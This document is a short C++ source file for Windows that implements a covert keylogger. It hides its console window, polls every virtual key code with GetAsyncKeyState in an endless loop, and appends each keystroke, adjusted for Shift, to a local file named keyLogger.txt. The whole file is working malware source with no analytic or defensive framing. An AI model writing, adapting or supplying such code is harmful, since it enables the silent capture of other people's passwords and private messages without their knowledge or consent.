#include <windows.h>
#include <fstream>
#include <conio.h>

// max and min virtual keys codes
#define MIN_VR_CODE 0 
#define MAX_VR_CODE 254

void createBackgroundProcess(void);

void saveToFile(int);

int main(int argc, char** argv) {
	createBackgroundProcess();

	while (true) {
		for (int i = MIN_VR_CODE; i <= MAX_VR_CODE; i++) {
			if (GetAsyncKeyState(i) & 0x01) { // checks is the least significant bit is set
				saveToFile(i);
			}
		}
	}
	return 0;
}

void createBackgroundProcess(void) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void saveToFile(int key) {
	std::ofstream out("keyLogger.txt", std::ios::out | std::ios::app);

	//int res = MapVirtualKey(key, MAPVK_VK_TO_CHAR);

	// interval of mouse keys
	if (key >= 1 && key <= 6) {
		return;
	}

	//Capital or not
	if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT)) {
		out << (char)key;
	} else {
		out << (char)std::tolower(key);
	}

	out.close();
}